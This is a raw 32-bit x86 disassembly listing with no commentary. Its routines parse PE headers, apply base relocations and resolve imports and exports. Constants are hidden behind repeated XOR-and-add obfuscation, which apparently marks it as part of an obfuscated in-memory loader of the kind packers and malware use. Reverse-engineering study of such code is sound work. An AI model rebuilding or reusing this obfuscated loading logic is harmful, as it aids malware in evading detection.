  41a71c:	lea    eax,[ebp-0x70]
  41a71f:	push   eax
  41a720:	mov    eax,DWORD PTR [ebp+0x8]
  41a723:	xor    eax,esi
  41a725:	add    eax,edi
  41a727:	push   eax
  41a728:	mov    eax,DWORD PTR [ebp+0x20]
  41a72b:	add    eax,0xee
  41a730:	push   eax
  41a731:	mov    eax,DWORD PTR [ebp+0x20]
  41a734:	mov    eax,DWORD PTR [eax+0x198]
  41a73a:	push   DWORD PTR [eax]
  41a73c:	mov    eax,DWORD PTR [ebp+0x10]
  41a73f:	call   eax
  41a741:	mov    eax,DWORD PTR [ebp+0x20]
  41a744:	mov    eax,DWORD PTR [eax+0x180]
  41a74a:	add    eax,DWORD PTR [ebp+0xc]
  41a74d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a750:	push   DWORD PTR [ebp+0x18]
  41a753:	mov    DWORD PTR [eax],ecx
  41a755:	push   DWORD PTR [ebp+0x14]
  41a758:	push   DWORD PTR [ebp+0x1c]
  41a75b:	call   ebx
  41a75d:	mov    eax,DWORD PTR [ebp+0xc]
  41a760:	add    eax,DWORD PTR [ebp+0x20]
  41a763:	lea    ecx,[ebp+0x4]
  41a766:	mov    DWORD PTR [ebp+0x20],eax
  41a769:	mov    eax,DWORD PTR [ebp+0x20]
  41a76c:	mov    eax,DWORD PTR [ebp+0x20]
  41a76f:	mov    edx,DWORD PTR [eax+0x190]
  41a775:	mov    eax,DWORD PTR [ebp+0x20]
  41a778:	mov    eax,DWORD PTR [eax+0x18c]
  41a77e:	mov    esi,DWORD PTR [eax]
  41a780:	cmp    DWORD PTR [ecx],esi
  41a782:	jb     0x41a7a3
  41a784:	mov    esi,DWORD PTR [edx]
  41a786:	mov    edi,DWORD PTR [edx]
  41a788:	mov    esi,DWORD PTR [esi+0x3c]
  41a78b:	lea    esi,[edi+esi*1+0x50]
  41a78f:	mov    edi,DWORD PTR [eax]
  41a791:	add    edi,DWORD PTR [esi]
  41a793:	cmp    DWORD PTR [ecx],edi
  41a795:	jae    0x41a7a3
  41a797:	mov    esi,DWORD PTR [eax]
  41a799:	mov    eax,DWORD PTR [ecx]
  41a79b:	mov    edx,DWORD PTR [edx]
  41a79d:	sub    eax,esi
  41a79f:	add    edx,eax
  41a7a1:	mov    DWORD PTR [ecx],edx
  41a7a3:	mov    eax,DWORD PTR [ebp+0xc]
  41a7a6:	jmp    0x41a7e9
  41a7a8:	push   DWORD PTR [ebp+0x20]
  41a7ab:	call   0x419782
  41a7b0:	mov    eax,DWORD PTR [ebp+0x20]
  41a7b3:	mov    eax,DWORD PTR [eax+0x1c8]
  41a7b9:	mov    eax,DWORD PTR [eax]
  41a7bb:	xor    eax,esi
  41a7bd:	add    eax,edi
  41a7bf:	mov    eax,DWORD PTR [ebp+0x20]
  41a7c2:	jne    0x41a7da
  41a7c4:	mov    ecx,DWORD PTR [ebp+0x20]
  41a7c7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41a7cd:	push   DWORD PTR [ecx]
  41a7cf:	mov    eax,DWORD PTR [eax+0x1d8]
  41a7d5:	call   DWORD PTR [eax+0x28]
  41a7d8:	jmp    0x41a7e7
  41a7da:	mov    eax,DWORD PTR [eax+0x17c]
  41a7e0:	mov    ecx,DWORD PTR [eax]
  41a7e2:	lea    eax,[ebp+0x4]
  41a7e5:	add    DWORD PTR [eax],ecx
  41a7e7:	xor    eax,eax
  41a7e9:	pop    edi
  41a7ea:	pop    esi
  41a7eb:	pop    ebx
  41a7ec:	leave  
  41a7ed:	ret    0x1c
  41a7f0:	push   ebp
  41a7f1:	mov    ebp,esp
  41a7f3:	sub    esp,0x1c
  41a7f6:	push   esi
  41a7f7:	mov    esi,eax
  41a7f9:	mov    eax,DWORD PTR [ecx+0x190]
  41a7ff:	cmp    DWORD PTR [eax],0x0
  41a802:	je     0x41a912
  41a808:	test   edx,edx
  41a80a:	je     0x41a912
  41a810:	test   esi,esi
  41a812:	je     0x41a912
  41a818:	mov    eax,DWORD PTR [esi+0x88]
  41a81e:	test   eax,eax
  41a820:	je     0x41a90d
  41a826:	cmp    DWORD PTR [esi+0x8c],0x10
  41a82d:	je     0x41a90d
  41a833:	cmp    DWORD PTR [esi+0x34],edx
  41a836:	je     0x41a90d
  41a83c:	mov    esi,DWORD PTR [ecx+0x18c]
  41a842:	and    DWORD PTR [ebp-0x10],0x0
  41a846:	mov    ecx,edx
  41a848:	sub    ecx,DWORD PTR [esi]
  41a84a:	add    eax,edx
  41a84c:	movzx  edx,WORD PTR [eax+0xc]
  41a850:	mov    DWORD PTR [ebp-0x1c],ecx
  41a853:	movzx  ecx,WORD PTR [eax+0xe]
  41a857:	add    ecx,edx
  41a859:	je     0x41a90d
  41a85f:	lea    ecx,[eax+0x14]
  41a862:	push   ebx
  41a863:	mov    DWORD PTR [ebp-0x18],ecx
  41a866:	mov    esi,0x7fffffff
  41a86b:	push   edi
  41a86c:	test   DWORD PTR [ecx],esi
  41a86e:	je     0x41a8ef
  41a870:	mov    edx,DWORD PTR [ecx]
  41a872:	and    DWORD PTR [ebp-0xc],0x0
  41a876:	and    edx,esi
  41a878:	add    edx,eax
  41a87a:	movzx  edi,WORD PTR [edx+0xe]
  41a87e:	movzx  ebx,WORD PTR [edx+0xc]
  41a882:	add    edi,ebx
  41a884:	je     0x41a8ef
  41a886:	lea    ecx,[edx+0x14]
  41a889:	mov    DWORD PTR [ebp-0x14],ecx
  41a88c:	test   DWORD PTR [ecx],esi
  41a88e:	je     0x41a8d1
  41a890:	mov    ecx,DWORD PTR [ecx]
  41a892:	and    DWORD PTR [ebp-0x8],0x0
  41a896:	and    ecx,esi
  41a898:	add    ecx,eax
  41a89a:	movzx  edi,WORD PTR [ecx+0xe]
  41a89e:	movzx  ebx,WORD PTR [ecx+0xc]
  41a8a2:	add    edi,ebx
  41a8a4:	je     0x41a8d1
  41a8a6:	lea    edi,[ecx+0x14]
  41a8a9:	mov    DWORD PTR [ebp-0x4],edi
  41a8ac:	mov    edi,DWORD PTR [ebp-0x4]
  41a8af:	mov    edi,DWORD PTR [edi]
  41a8b1:	test   edi,edi
  41a8b3:	je     0x41a8bb
  41a8b5:	mov    ebx,DWORD PTR [ebp-0x1c]
  41a8b8:	add    DWORD PTR [edi+eax*1],ebx
  41a8bb:	movzx  edi,WORD PTR [ecx+0xe]
  41a8bf:	movzx  ebx,WORD PTR [ecx+0xc]
  41a8c3:	inc    DWORD PTR [ebp-0x8]
  41a8c6:	add    DWORD PTR [ebp-0x4],0x8
  41a8ca:	add    edi,ebx
  41a8cc:	cmp    DWORD PTR [ebp-0x8],edi
  41a8cf:	jb     0x41a8ac
  41a8d1:	movzx  edi,WORD PTR [edx+0xe]
  41a8d5:	movzx  ebx,WORD PTR [edx+0xc]
  41a8d9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8dc:	inc    DWORD PTR [ebp-0xc]
  41a8df:	add    ecx,0x8
  41a8e2:	add    edi,ebx
  41a8e4:	mov    DWORD PTR [ebp-0x14],ecx
  41a8e7:	cmp    DWORD PTR [ebp-0xc],edi
  41a8ea:	jb     0x41a88c
  41a8ec:	mov    ecx,DWORD PTR [ebp-0x18]
  41a8ef:	movzx  edx,WORD PTR [eax+0xe]
  41a8f3:	movzx  edi,WORD PTR [eax+0xc]
  41a8f7:	inc    DWORD PTR [ebp-0x10]
  41a8fa:	add    ecx,0x8
  41a8fd:	add    edx,edi
  41a8ff:	mov    DWORD PTR [ebp-0x18],ecx
  41a902:	cmp    DWORD PTR [ebp-0x10],edx
  41a905:	jb     0x41a86c
  41a90b:	pop    edi
  41a90c:	pop    ebx
  41a90d:	xor    eax,eax
  41a90f:	inc    eax
  41a910:	jmp    0x41a914
  41a912:	xor    eax,eax
  41a914:	pop    esi
  41a915:	leave  
  41a916:	ret    
  41a917:	push   ebp
  41a918:	mov    ebp,esp
  41a91a:	mov    ecx,DWORD PTR [ecx+0x190]
  41a920:	mov    eax,DWORD PTR [ebp+0xc]
  41a923:	sub    esp,0x10
  41a926:	push   ebx
  41a927:	xor    ebx,ebx
  41a929:	push   esi
  41a92a:	push   edi
  41a92b:	cmp    DWORD PTR [ecx],ebx
  41a92d:	je     0x41a9b5
  41a933:	cmp    eax,ebx
  41a935:	je     0x41a9b5
  41a937:	cmp    DWORD PTR [eax+0x78],ebx
  41a93a:	jne    0x41a941
  41a93c:	xor    eax,eax
  41a93e:	inc    eax
  41a93f:	jmp    0x41a9b7
  41a941:	mov    eax,DWORD PTR [eax+0x78]
  41a944:	add    eax,DWORD PTR [ebp+0x8]
  41a947:	mov    ecx,DWORD PTR [eax+0x1c]
  41a94a:	mov    edx,DWORD PTR [eax+0x24]
  41a94d:	mov    esi,DWORD PTR [eax+0x14]
  41a950:	mov    edi,DWORD PTR [eax+0x18]
  41a953:	add    ecx,DWORD PTR [ebp+0x8]
  41a956:	add    edx,DWORD PTR [ebp+0x8]
  41a959:	mov    DWORD PTR [ebp-0x4],esi
  41a95c:	cmp    esi,edi
  41a95e:	ja     0x41a963
  41a960:	mov    DWORD PTR [ebp-0x4],edi
  41a963:	mov    DWORD PTR [ebp-0x8],ebx
  41a966:	cmp    DWORD PTR [ebp-0x4],ebx
  41a969:	jbe    0x41a93c
  41a96b:	cmp    ebx,DWORD PTR [eax+0x14]
  41a96e:	jae    0x41a976
  41a970:	movzx  esi,WORD PTR [edx+ebx*2]
  41a974:	jmp    0x41a978
  41a976:	mov    esi,ebx
  41a978:	lea    esi,[ecx+esi*4]
  41a97b:	mov    edi,DWORD PTR [esi]
  41a97d:	test   edi,edi
  41a97f:	je     0x41a9aa
  41a981:	add    edi,DWORD PTR [ebp+0x8]
  41a984:	mov    DWORD PTR [ebp-0x10],edi
  41a987:	cmp    edi,eax
  41a989:	jbe    0x41a99b
  41a98b:	mov    ebx,DWORD PTR [ebp+0xc]
  41a98e:	mov    ebx,DWORD PTR [ebx+0x7c]
  41a991:	add    ebx,eax
  41a993:	cmp    edi,ebx
  41a995:	jae    0x41a99b
  41a997:	mov    esi,DWORD PTR [esi]
  41a999:	jmp    0x41a9a3
  41a99b:	sub    edi,DWORD PTR [ebp+0x8]
  41a99e:	mov    DWORD PTR [esi],edi
  41a9a0:	mov    esi,DWORD PTR [ebp-0x10]
  41a9a3:	test   esi,esi
  41a9a5:	je     0x41a9b5
  41a9a7:	mov    ebx,DWORD PTR [ebp-0x8]
  41a9aa:	inc    ebx
  41a9ab:	mov    DWORD PTR [ebp-0x8],ebx
  41a9ae:	cmp    ebx,DWORD PTR [ebp-0x4]
  41a9b1:	jb     0x41a96b
  41a9b3:	jmp    0x41a93c
  41a9b5:	xor    eax,eax
  41a9b7:	pop    edi
  41a9b8:	pop    esi
  41a9b9:	pop    ebx
  41a9ba:	leave  
  41a9bb:	ret    0x8
  41a9be:	push   ebp
  41a9bf:	mov    ebp,esp
  41a9c1:	sub    esp,0x2c
  41a9c4:	mov    edx,0xf89c85b9
  41a9c9:	mov    DWORD PTR [ebp-0x4],edx
  41a9cc:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41a9d3:	mov    eax,DWORD PTR [ebp-0x4]
  41a9d6:	mov    ecx,DWORD PTR [ebp-0x4]
  41a9d9:	mov    ecx,DWORD PTR [ebp-0x4]
  41a9dc:	mov    ecx,DWORD PTR [ebp-0x4]
  41a9df:	mov    ecx,DWORD PTR [ebp-0x4]
  41a9e2:	mov    ecx,DWORD PTR [ebp-0x4]
  41a9e5:	push   ebx
  41a9e6:	mov    ebx,DWORD PTR [ebp+0x10]
  41a9e9:	push   esi
  41a9ea:	mov    esi,0x7510899
  41a9ef:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41a9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41a9f9:	mov    ebx,DWORD PTR [ebx+0x190]
  41a9ff:	push   edi
  41aa00:	mov    edi,0x3272e0
  41aa05:	xor    ecx,esi
  41aa07:	xor    eax,esi
  41aa09:	add    eax,edi
  41aa0b:	add    ecx,edi
  41aa0d:	mov    DWORD PTR [ebp-0x18],eax
  41aa10:	cmp    ecx,DWORD PTR [ebx]
  41aa12:	je     0x41ac93
  41aa18:	mov    ebx,DWORD PTR [ebp-0x4]
  41aa1b:	mov    ecx,DWORD PTR [ebp+0xc]
  41aa1e:	xor    ebx,esi
  41aa20:	add    ebx,edi
  41aa22:	cmp    ebx,ecx
  41aa24:	je     0x41ac93
  41aa2a:	mov    ebx,DWORD PTR [ebp-0x4]
  41aa2d:	mov    ecx,DWORD PTR [ecx+0x80]
  41aa33:	xor    ebx,esi
  41aa35:	add    ebx,edi
  41aa37:	cmp    ecx,ebx
  41aa39:	je     0x41ac8e
  41aa3f:	add    ecx,DWORD PTR [ebp+0x8]
  41aa42:	mov    DWORD PTR [ebp-0x2c],ecx
  41aa45:	mov    ebx,edx
  41aa47:	xor    ebx,esi
  41aa49:	add    ebx,edi
  41aa4b:	mov    DWORD PTR [ebp-0x10],ebx
  41aa4e:	mov    ebx,DWORD PTR [ebp-0x10]
  41aa51:	cmp    ebx,edx
  41aa53:	je     0x41aa67
  41aa55:	mov    edx,DWORD PTR [ebp-0x10]
  41aa58:	mov    ebx,DWORD PTR [ebp-0x4]
  41aa5b:	imul   edx,edx,0x14
  41aa5e:	xor    ebx,esi
  41aa60:	add    ebx,edi
  41aa62:	cmp    DWORD PTR [edx+ecx*1],ebx
  41aa65:	jne    0x41aa7e
  41aa67:	mov    edx,DWORD PTR [ebp-0x10]
  41aa6a:	mov    ebx,DWORD PTR [ebp-0x4]
  41aa6d:	imul   edx,edx,0x14
  41aa70:	xor    ebx,esi
  41aa72:	add    ebx,edi
  41aa74:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41aa78:	je     0x41ac80
  41aa7e:	mov    eax,DWORD PTR [ebp-0x4]
  41aa81:	mov    ebx,DWORD PTR [ebp-0x4]
  41aa84:	mov    eax,DWORD PTR [ebp-0x10]
  41aa87:	imul   eax,eax,0x14
  41aa8a:	add    eax,ecx
  41aa8c:	mov    ecx,DWORD PTR [eax+0x10]
  41aa8f:	add    ecx,DWORD PTR [ebp+0x8]
  41aa92:	xor    ebx,esi
  41aa94:	mov    DWORD PTR [ebp-0x1c],ecx
  41aa97:	mov    ecx,DWORD PTR [ebp-0x4]
  41aa9a:	mov    edx,DWORD PTR [ebp-0x4]
  41aa9d:	xor    ecx,esi
  41aa9f:	add    ecx,edi
  41aaa1:	xor    edx,esi
  41aaa3:	mov    DWORD PTR [ebp-0x24],ecx
  41aaa6:	mov    ecx,DWORD PTR [eax]
  41aaa8:	add    edx,edi
  41aaaa:	add    ebx,edi
  41aaac:	cmp    ecx,edx
  41aaae:	je     0x41aab6
  41aab0:	add    ecx,DWORD PTR [ebp+0x8]
  41aab3:	mov    DWORD PTR [ebp-0x24],ecx
  41aab6:	mov    ecx,DWORD PTR [ebp-0x4]
  41aab9:	xor    ecx,esi
  41aabb:	add    ecx,DWORD PTR [eax+0xc]
  41aabe:	mov    eax,DWORD PTR [ebp+0x8]
  41aac1:	lea    eax,[ecx+eax*1+0x3272e0]
  41aac8:	mov    DWORD PTR [ebp+0xc],eax
  41aacb:	mov    DWORD PTR [ebp-0x28],0xf89c85bc
  41aad2:	mov    eax,DWORD PTR [ebp+0x10]
  41aad5:	push   DWORD PTR [ebp+0xc]
  41aad8:	mov    eax,DWORD PTR [eax+0x1d8]
  41aade:	call   DWORD PTR [eax]
  41aae0:	mov    ecx,DWORD PTR [ebp-0x4]
  41aae3:	xor    ecx,esi
  41aae5:	add    ecx,edi
  41aae7:	mov    DWORD PTR [ebp-0xc],eax
  41aaea:	cmp    ecx,eax
  41aaec:	jne    0x41ab00
  41aaee:	mov    eax,DWORD PTR [ebp+0x10]
  41aaf1:	push   DWORD PTR [ebp+0xc]
  41aaf4:	mov    eax,DWORD PTR [eax+0x1d8]
  41aafa:	call   DWORD PTR [eax+0xc]
  41aafd:	mov    DWORD PTR [ebp-0xc],eax
  41ab00:	mov    DWORD PTR [ebp-0x20],0x7f661b00
  41ab07:	mov    DWORD PTR [ebp-0x20],0xf89c9990
  41ab0e:	mov    eax,DWORD PTR [ebp-0x4]
  41ab11:	xor    eax,esi
  41ab13:	add    eax,edi
  41ab15:	cmp    eax,DWORD PTR [ebp-0xc]
  41ab18:	jne    0x41ab3d
  41ab1a:	mov    eax,DWORD PTR [ebp-0x8]
  41ab1d:	mov    ecx,DWORD PTR [ebp-0x20]
  41ab20:	xor    eax,esi
  41ab22:	xor    ecx,esi
  41ab24:	lea    ebx,[ebx+eax*1+0x3272e0]
  41ab2b:	mov    eax,DWORD PTR [ebp+0x10]
  41ab2e:	mov    eax,DWORD PTR [eax+0x1d8]
  41ab34:	add    ecx,edi
  41ab36:	imul   ecx,ebx
  41ab39:	push   ecx
  41ab3a:	call   DWORD PTR [eax+0x24]
  41ab3d:	mov    eax,DWORD PTR [ebp-0x4]
  41ab40:	xor    eax,esi
  41ab42:	add    eax,edi
  41ab44:	cmp    eax,DWORD PTR [ebp-0xc]
  41ab47:	jne    0x41ab58
  41ab49:	mov    eax,DWORD PTR [ebp-0x28]
  41ab4c:	xor    eax,esi
  41ab4e:	add    eax,edi
  41ab50:	cmp    ebx,eax
  41ab52:	jbe    0x41aad2
  41ab58:	mov    eax,DWORD PTR [ebp-0x4]
  41ab5b:	xor    eax,esi
  41ab5d:	add    eax,edi
  41ab5f:	cmp    eax,DWORD PTR [ebp-0xc]
  41ab62:	jne    0x41ab7b
  41ab64:	mov    eax,DWORD PTR [ebp-0x8]
  41ab67:	mov    ecx,DWORD PTR [ebp-0x18]
  41ab6a:	xor    eax,esi
  41ab6c:	lea    eax,[ecx+eax*1+0x3272e0]
  41ab73:	mov    DWORD PTR [ebp-0x18],eax
  41ab76:	jmp    0x41ac6a
  41ab7b:	mov    DWORD PTR [ebp-0x14],0x1121b01
  41ab82:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41ab89:	mov    ebx,DWORD PTR [ebp-0x4]
  41ab8c:	xor    ebx,esi
  41ab8e:	add    ebx,edi
  41ab90:	jmp    0x41ac57
  41ab95:	mov    eax,DWORD PTR [ebp-0x4]
  41ab98:	xor    eax,esi
  41ab9a:	add    eax,edi
  41ab9c:	mov    DWORD PTR [ebp-0x14],eax
  41ab9f:	mov    eax,DWORD PTR [ebp-0x4]
  41aba2:	xor    eax,esi
  41aba4:	add    eax,edi
  41aba6:	mov    DWORD PTR [ebp+0xc],eax
  41aba9:	mov    ecx,DWORD PTR [ebp-0x4]
  41abac:	mov    eax,DWORD PTR [ebp-0x24]
  41abaf:	xor    ecx,esi
  41abb1:	add    ecx,edi
  41abb3:	cmp    ecx,eax
  41abb5:	je     0x41abbd
  41abb7:	mov    eax,DWORD PTR [eax+ebx*4]
  41abba:	mov    DWORD PTR [ebp-0x14],eax
  41abbd:	mov    eax,DWORD PTR [ebp-0x1c]
  41abc0:	mov    eax,DWORD PTR [eax+ebx*4]
  41abc3:	mov    DWORD PTR [ebp+0xc],eax
  41abc6:	mov    eax,DWORD PTR [ebp-0x4]
  41abc9:	mov    ecx,DWORD PTR [ebp-0x14]
  41abcc:	xor    eax,esi
  41abce:	add    eax,edi
  41abd0:	cmp    eax,ecx
  41abd2:	je     0x41abfd
  41abd4:	mov    eax,DWORD PTR [ebp-0x4]
  41abd7:	mov    ecx,DWORD PTR [ebp-0x14]
  41abda:	xor    eax,esi
  41abdc:	add    eax,edi
  41abde:	shr    ecx,0x1f
  41abe1:	cmp    eax,ecx
  41abe3:	je     0x41abfd
  41abe5:	mov    ecx,DWORD PTR [ebp-0x14]
  41abe8:	mov    eax,DWORD PTR [ebp+0x10]
  41abeb:	mov    eax,DWORD PTR [eax+0x1d8]
  41abf1:	movzx  ecx,cx
  41abf4:	push   ecx
  41abf5:	push   DWORD PTR [ebp-0xc]
  41abf8:	call   DWORD PTR [eax+0x8]
  41abfb:	jmp    0x41ac16
  41abfd:	mov    eax,DWORD PTR [ebp+0xc]
  41ac00:	add    eax,DWORD PTR [ebp+0x8]
  41ac03:	mov    ecx,DWORD PTR [ebp+0x10]
  41ac06:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ac0c:	add    eax,0x2
  41ac0f:	push   eax
  41ac10:	push   DWORD PTR [ebp-0xc]
  41ac13:	call   DWORD PTR [ecx+0x8]
  41ac16:	mov    DWORD PTR [ebp+0xc],eax
  41ac19:	mov    eax,DWORD PTR [ebp-0x4]
  41ac1c:	mov    ecx,DWORD PTR [ebp+0xc]
  41ac1f:	xor    eax,esi
  41ac21:	add    eax,edi
  41ac23:	cmp    eax,ecx
  41ac25:	mov    eax,DWORD PTR [ebp-0x8]
  41ac28:	jne    0x41ac3b
  41ac2a:	mov    ecx,DWORD PTR [ebp-0x18]
  41ac2d:	xor    eax,esi
  41ac2f:	lea    eax,[ecx+eax*1+0x3272e0]
  41ac36:	mov    DWORD PTR [ebp-0x18],eax
  41ac39:	jmp    0x41ac4b
  41ac3b:	mov    ecx,DWORD PTR [ebp+0xc]
  41ac3e:	xor    eax,esi
  41ac40:	add    eax,edi
  41ac42:	imul   eax,ecx
  41ac45:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ac48:	mov    DWORD PTR [ecx+ebx*4],eax
  41ac4b:	mov    eax,DWORD PTR [ebp-0x8]
  41ac4e:	xor    eax,esi
  41ac50:	lea    ebx,[ebx+eax*1+0x3272e0]
  41ac57:	mov    eax,DWORD PTR [ebp-0x4]
  41ac5a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ac5d:	xor    eax,esi
  41ac5f:	add    eax,edi
  41ac61:	cmp    DWORD PTR [ecx+ebx*4],eax
  41ac64:	jne    0x41ab95
  41ac6a:	mov    edx,DWORD PTR [ebp-0x10]
  41ac6d:	mov    eax,DWORD PTR [ebp-0x18]
  41ac70:	mov    ecx,DWORD PTR [ebp-0x2c]
  41ac73:	sub    edx,0x3272df
  41ac79:	xor    edx,esi
  41ac7b:	jmp    0x41aa45
  41ac80:	mov    ecx,DWORD PTR [ebp-0x4]
  41ac83:	xor    ecx,esi
  41ac85:	add    ecx,edi
  41ac87:	cmp    eax,ecx
  41ac89:	mov    eax,DWORD PTR [ebp-0x4]
  41ac8c:	jne    0x41ac96
  41ac8e:	mov    eax,DWORD PTR [ebp-0x8]
  41ac91:	jmp    0x41ac96
  41ac93:	mov    eax,DWORD PTR [ebp-0x4]
  41ac96:	xor    eax,esi
  41ac98:	add    eax,edi
  41ac9a:	pop    edi
  41ac9b:	pop    esi
  41ac9c:	pop    ebx
  41ac9d:	leave  
  41ac9e:	ret    0xc
  41aca1:	push   ebp
  41aca2:	mov    ebp,esp
  41aca4:	sub    esp,0x28
  41aca7:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41acae:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41acb5:	mov    eax,DWORD PTR [ebp+0xc]
  41acb8:	mov    DWORD PTR [ebp+0xc],eax
  41acbb:	push   esi
  41acbc:	mov    eax,eax
  41acbe:	mov    eax,DWORD PTR [ebp-0x4]
  41acc1:	mov    esi,DWORD PTR [ebp+0x8]
  41acc4:	mov    ecx,0x7510899
  41acc9:	xor    eax,ecx
  41accb:	mov    edx,0x3272e0
  41acd0:	add    eax,edx
  41acd2:	cmp    esi,eax
  41acd4:	je     0x41adfb
  41acda:	mov    eax,DWORD PTR [ebp+0x8]
  41acdd:	mov    esi,DWORD PTR [ebp+0x8]
  41ace0:	add    esi,DWORD PTR [eax+0x3c]
  41ace3:	push   edi
  41ace4:	mov    DWORD PTR [ebp+0xc],esi
  41ace7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bc
  41acee:	mov    eax,DWORD PTR [ebp-0x1c]
  41acf1:	mov    esi,DWORD PTR [ebp-0x4]
  41acf4:	mov    edi,DWORD PTR [ebp+0xc]
  41acf7:	xor    esi,ecx
  41acf9:	xor    eax,ecx
  41acfb:	add    esi,edx
  41acfd:	cmp    DWORD PTR [edi+eax*8+0x1939778],esi
  41ad04:	je     0x41adf5
  41ad0a:	mov    esi,DWORD PTR [ebp+0xc]
  41ad0d:	mov    eax,DWORD PTR [ebp+0x8]
  41ad10:	add    eax,DWORD PTR [esi+0xa0]
  41ad16:	mov    esi,DWORD PTR [ebp+0x8]
  41ad19:	mov    edi,DWORD PTR [ebp+0xc]
  41ad1c:	sub    esi,DWORD PTR [edi+0x34]
  41ad1f:	mov    edi,DWORD PTR [ebp-0x4]
  41ad22:	xor    edi,ecx
  41ad24:	add    edi,edx
  41ad26:	mov    DWORD PTR [ebp-0x24],esi
  41ad29:	cmp    esi,edi
  41ad2b:	je     0x41adf5
  41ad31:	mov    esi,DWORD PTR [ebp-0x4]
  41ad34:	xor    esi,ecx
  41ad36:	add    esi,edx
  41ad38:	mov    DWORD PTR [ebp-0x8],esi
  41ad3b:	push   ebx
  41ad3c:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41ad43:	jmp    0x41addf
  41ad48:	mov    esi,DWORD PTR [ebp-0x4]
  41ad4b:	xor    esi,ecx
  41ad4d:	lea    edi,[ebx-0x8]
  41ad50:	add    esi,edx
  41ad52:	shr    edi,1
  41ad54:	cmp    esi,edi
  41ad56:	jae    0x41adc5
  41ad58:	sub    edi,esi
  41ad5a:	lea    ebx,[eax+esi*2+0x8]
  41ad5e:	mov    DWORD PTR [ebp-0x18],edi
  41ad61:	movzx  esi,WORD PTR [ebx]
  41ad64:	and    esi,0xfff
  41ad6a:	mov    DWORD PTR [ebp-0x14],esi
  41ad6d:	mov    edi,DWORD PTR [ebp-0x14]
  41ad70:	mov    esi,DWORD PTR [eax]
  41ad72:	sub    esi,edx
  41ad74:	add    edi,esi
  41ad76:	movzx  esi,WORD PTR [ebx]
  41ad79:	shr    esi,0xc
  41ad7c:	xor    edi,ecx
  41ad7e:	mov    DWORD PTR [ebp-0x20],edi
  41ad81:	mov    DWORD PTR [ebp-0x14],esi
  41ad84:	mov    esi,DWORD PTR [ebp-0x20]
  41ad87:	mov    edi,DWORD PTR [ebp+0x8]
  41ad8a:	xor    esi,ecx
  41ad8c:	lea    esi,[esi+edi*1+0x3272e0]
  41ad93:	mov    DWORD PTR [ebp-0x20],esi
  41ad96:	mov    esi,DWORD PTR [ebp-0x10]
  41ad99:	mov    edi,DWORD PTR [ebp-0x14]
  41ad9c:	xor    esi,ecx
  41ad9e:	add    esi,edx
  41ada0:	cmp    edi,esi
  41ada2:	jne    0x41adba
  41ada4:	mov    esi,DWORD PTR [ebp-0x10]
  41ada7:	mov    edi,DWORD PTR [ebp-0x14]
  41adaa:	xor    esi,ecx
  41adac:	add    esi,edx
  41adae:	cmp    edi,esi
  41adb0:	jne    0x41adba
  41adb2:	mov    esi,DWORD PTR [ebp-0x20]
  41adb5:	mov    edi,DWORD PTR [ebp-0x24]
  41adb8:	add    DWORD PTR [esi],edi
  41adba:	add    ebx,0x2
  41adbd:	dec    DWORD PTR [ebp-0x18]
  41adc0:	jne    0x41ad61
  41adc2:	mov    ebx,DWORD PTR [ebp-0xc]
  41adc5:	add    DWORD PTR [ebp-0x8],ebx
  41adc8:	mov    esi,DWORD PTR [ebp-0x1c]
  41adcb:	mov    edi,DWORD PTR [ebp-0x8]
  41adce:	mov    ebx,DWORD PTR [ebp+0xc]
  41add1:	xor    esi,ecx
  41add3:	cmp    edi,DWORD PTR [ebx+esi*8+0x193977c]
  41adda:	jae    0x41adf4
  41addc:	add    eax,DWORD PTR [ebp-0xc]
  41addf:	mov    esi,DWORD PTR [ebp-0x4]
  41ade2:	mov    ebx,DWORD PTR [eax+0x4]
  41ade5:	xor    esi,ecx
  41ade7:	add    esi,edx
  41ade9:	mov    DWORD PTR [ebp-0xc],ebx
  41adec:	cmp    ebx,esi
  41adee:	jne    0x41ad48
  41adf4:	pop    ebx
  41adf5:	mov    eax,DWORD PTR [ebp-0x28]
  41adf8:	pop    edi
  41adf9:	jmp    0x41adfe
  41adfb:	mov    eax,DWORD PTR [ebp-0x4]
  41adfe:	xor    eax,ecx
  41ae00:	add    eax,edx
  41ae02:	pop    esi
  41ae03:	leave  
  41ae04:	ret    0x8
  41ae07:	push   ebp
  41ae08:	mov    ebp,esp
  41ae0a:	sub    esp,0xcc
  41ae10:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41ae17:	mov    DWORD PTR [ebp-0x24],0xf89c85b8
  41ae1e:	mov    eax,DWORD PTR [ebp-0x4]
  41ae21:	push   ebx
  41ae22:	push   esi
  41ae23:	mov    esi,0x7510899
  41ae28:	xor    eax,esi
  41ae2a:	push   edi
  41ae2b:	mov    edi,0x3272e0
  41ae30:	add    eax,edi
  41ae32:	mov    DWORD PTR [ebp-0x1c],eax
  41ae35:	mov    eax,DWORD PTR [ebp-0x4]
  41ae38:	xor    eax,esi
  41ae3a:	add    eax,edi
  41ae3c:	mov    DWORD PTR [ebp-0x8],eax
  41ae3f:	mov    ebx,DWORD PTR [ebp+0x20]
  41ae42:	mov    eax,DWORD PTR [ebp-0x14]
  41ae45:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae48:	xor    eax,ecx
  41ae4a:	mov    DWORD PTR [ebp-0x14],eax
  41ae4d:	add    DWORD PTR [ebp-0x14],0xf89cb5b9
  41ae54:	mov    eax,DWORD PTR [ebp-0xc]
  41ae57:	mov    ecx,DWORD PTR [ebp-0xc]
  41ae5a:	xor    eax,ecx
  41ae5c:	mov    DWORD PTR [ebp-0xc],eax
  41ae5f:	add    DWORD PTR [ebp-0xc],0xf89c85f9
  41ae66:	mov    eax,DWORD PTR [ebp-0x10]
  41ae69:	mov    ecx,DWORD PTR [ebp-0x10]
  41ae6c:	xor    eax,ecx
  41ae6e:	mov    DWORD PTR [ebp-0x10],eax
